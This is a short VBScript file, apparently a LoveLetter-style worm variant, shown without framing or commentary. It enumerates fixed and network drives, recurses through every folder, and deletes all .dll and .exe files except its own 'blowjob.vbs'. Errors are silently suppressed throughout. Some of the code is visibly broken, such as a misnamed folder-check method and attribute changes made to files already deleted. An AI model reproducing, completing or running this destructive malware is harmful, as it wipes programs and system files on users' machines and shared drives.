   On Error Resume Next
   Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
   eq = ""
   ctr = 0
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set file = fso.OpenTextFile(WScript.ScriptFullName, 1)
   vbscopy = file.ReadAll
   main()

   Sub main()
   On Error Resume Next
   Dim wscr
   Set wscr = CreateObject("WScript.Shell")
   Set dirwin = fso.GetSpecialFolder(0)
   Set dirsystem = fso.GetSpecialFolder(1)
   Set dirtemp = fso.GetSpecialFolder(2)
   Set c = fso.GetFile(WScript.ScriptFullName)
   listadriv()
   End Sub

   Sub listadriv()
   On Error Resume Next
   Dim d, dc, s
   Set dc = fso.Drives
   For Each d In dc
   If d.DriveType = 2 Or d.DriveType = 3 Then
   folderlist(d.path&"\")
   End If
   Next
   listadriv = s
   End Sub

   Sub infectfiles(folderspec)
   On Error Resume Next
   Dim f, f1, fc, ext, ap, mircfname, s, bname
   Set f = fso.GetFolder(folderspec)
   Set fc = f.Files
   For Each f1 In fc
   ext = fso.GetExtensionName(f1.Path)
   ext = LCase(ext)
   s = LCase(f1.Name)
   If s <> "blowjob.vbs" Then
   If (ext = "dll") Or (ext = "exe") Then
   fso.DeleteFile (f1.Path)
   Set att = fso.GetFile(f1.Path)
   att.Attributes = att.Attributes + 2
   End If
   End If
   Next
   End Sub

   Sub folderlist(folderspec)
   On Error Resume Next
   Dim f, f1, sf
   Set f = fso.GetFolder(folderspec)
   Set sf = f.SubFolders
   For Each f1 In sf
   infectfiles (f1.Path)
   folderlist (f1.Path)
   Next
   End Sub

   Function fileexist(filespec)
   On Error Resume Next
   Dim msg
   If (fso.FileExists(filespec)) Then
   msg = 0
   Else
   msg = 1
   End If
   fileexist = msg
   End Function

   Function folderexist(folderspec)
   On Error Resume Next
   Dim msg
   If (fso.GetFolderExists(folderspec)) Then
   msg = 0
   Else
   msg = 1
   End If
   fileexist = msg
   End Function
